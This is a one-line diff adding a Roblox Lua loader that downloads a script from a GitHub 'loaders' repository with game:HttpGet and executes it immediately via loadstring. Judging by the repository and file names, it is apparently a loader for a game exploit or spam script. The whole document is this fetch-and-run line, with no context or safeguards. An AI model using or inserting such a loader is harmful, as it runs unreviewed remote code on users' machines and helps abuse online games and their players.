@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/bunker-vs-verity-spam1-io40eyquggt4yi.lua"))()
